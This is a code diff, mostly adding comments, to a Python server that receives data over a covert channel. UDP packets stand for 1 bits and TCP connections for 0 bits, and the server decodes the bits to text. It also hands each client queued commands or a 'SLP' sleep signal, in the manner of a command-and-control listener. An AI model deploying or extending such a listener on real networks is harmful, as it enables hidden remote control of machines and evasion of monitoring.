@@ -11,6 +11,8 @@ HOSTDICT = dict()
 PORT = 1234
 HOST = "127.0.0.1"
 
+
+#Thread function
 def handle_UDP(UDPsock:socket,BinaryHolder:list):
     global EOF
     global LOCK
@@ -29,6 +31,7 @@ def handle_UDP(UDPsock:socket,BinaryHolder:list):
             break
 
 
+#Thread function
 def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list):
     global EOF
     global LOCK
@@ -38,6 +41,7 @@ def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list):
         except Socket.timeout:
             continue
         recv_client_list(clientAddr)
+
         LOCK.acquire()
         BinaryHolder.append("0")
         clientSock.close()
@@ -55,38 +59,40 @@ def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list):
     senderIp.append(clientAddr[0])
 
 
-
-
-def decode(BinaryList:list): #Convert the collected binary list into a string
+#Convert the collected binary list into a string
+def decode(BinaryList:list):
     message = ""
     binaryString = ""
     for i in range(len(BinaryList)):
-        binaryString += BinaryList[i]
+        binaryString += BinaryList[i] #int to string
     for i in range(0,len(binaryString),8):
-        message += chr(int(binaryString[i:i+8],2))
+        message += chr(int(binaryString[i:i+8],2)) #Binary piece -> ASCII code -> Char
     return message
 
 
+#Determines state of client
 def recv_client_list(clientAddr:tuple):
     global LISTLOCK
     global HOSTDICT
-    if clientAddr not in HOSTDICT.keys():
+    if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
         LISTLOCK.acquire()
-        HOSTDICT[clientAddr] = list()
+        HOSTDICT[clientAddr] = list() #adds if not
         LISTLOCK.release()
 
 
-def send_client_list(clientAddr:tuple) -> str: #Fetch queued commands and return
+#Fetch queued commands and return
+def send_client_list(clientAddr:tuple) -> str: 
     global LISTLOCK
     global HOSTDICT
     with LISTLOCK:
-        if len(HOSTDICT.get(clientAddr, [])) == 0: # type: ignore
+        if len(HOSTDICT.get(clientAddr, [])) == 0: #Dict with Addr tuple keys and a list of commands as values.
             return "SLP"
         else:
             return HOSTDICT[clientAddr].pop(0)
 
 
-def build_socket(sockType, host:str, port:int):
+#Builder for sockets
+def build_socket(sockType, host:str, port:int) -> socket: 
     serverSock = Socket.socket(Socket.AF_INET,sockType)
     serverSock.setsockopt(Socket.SOL_SOCKET,Socket.SO_REUSEADDR,1)
     serverSock.settimeout(0.1)
@@ -94,22 +100,24 @@ def build_socket(sockType, host:str, port:int):
     return serverSock
 
 
-def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket) -> str:
-    BinaryList = []
-    senderIp = []
+#Main incoming traffic handler
+def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
+    BinaryList = [] #holds all incoming binary
+    senderIp = [] #holds the ip of message sender
     EOF = False
 
     #This is receiving data
     udp_Thread = threading.Thread(target=handle_UDP,args=(serverSocketUDP,BinaryList)) #Handles ones
     tcp_Thread = threading.Thread(target=handle_TCP,args=(serverSocketTCP,BinaryList,senderIp)) #Handles zeros
     threads = [udp_Thread,tcp_Thread]
+
     for thread in threads:
         thread.start()
     for thread in threads:
         thread.join()
-    output = decode(BinaryList)
-    print(senderIp[0]+": "+output) #Prints what the client sent discretely
-    return output
+
+    output = decode(BinaryList) 
+    print(senderIp[0]+": "+output)
 
 
 def main():
